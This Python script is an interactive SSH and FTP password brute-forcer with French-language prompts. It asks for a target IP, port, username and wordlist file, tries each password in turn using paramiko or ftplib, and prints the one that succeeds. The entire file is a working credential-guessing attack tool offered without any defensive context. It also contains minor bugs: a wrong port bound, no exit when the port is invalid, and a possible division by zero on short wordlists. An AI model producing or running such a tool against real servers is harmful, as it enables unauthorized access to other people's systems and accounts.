import paramiko
from ftplib import FTP
import re

step = 100

def verify_IPv4(input: str)-> bool:
	if isinstance(input, str):
		ipv4_regex = re.compile(r'^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$')
		if ipv4_regex.match(input):
			return True
	return False

def brute_ssh(host, port, username, password, client):
    try:
        client.connect(hostname=host, port=port, username=username, password=password)
        print("[*] Successfully logged in via SSH!")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        client.close()


def brute_ftp(host, port, username, password, ftp):
    try:
        ftp.connect(host, port)
        ftp.login(username, password)
        print("[*] Successfully logged in via FTP!")
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        ftp.quit()


def bruteforce():
    protocol = input("Choisissez le protocole à bruteforcer (SSH ou FTP) : ").strip().lower()
    host = input("Entrez l'adresse IP du serveur : ")
    if not verify_IPv4(host):
        print("l'ip est invalide")
        return
    port = int(input("Entrez le port du serveur : "))
    if (port > 65655) or (port < 0):
        print("port invalide")
    username = input("Entrez le nom d'utilisateur : ")
    password_list = input("Entrez le chemin du fichier contenant les mots de passe : ")

    with open(password_list, 'r') as f:
        passwords = f.readlines()
    if protocol not in ['ssh', 'ftp']:
        print("[!] Protocole invalide, veuillez choisir entre SSH ou FTP")
        exit(1)
    (protocol_function, client) = (brute_ssh, paramiko.SSHClient()) if protocol == 'ssh' else (brute_ftp, FTP())
    if protocol == 'ssh':
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
    percent_step = len(passwords) // step
    percent_factor = step / len(passwords)
    for (num_password, password) in enumerate(passwords):
        password = password.strip()
        if not num_password % percent_step:
            percent = num_password * percent_factor
            print(f"mots de passe vérifiés : {percent}%")
        if protocol_function(host, port, username, password, client):
            print(f"Le mot de passe est : {password}")
            break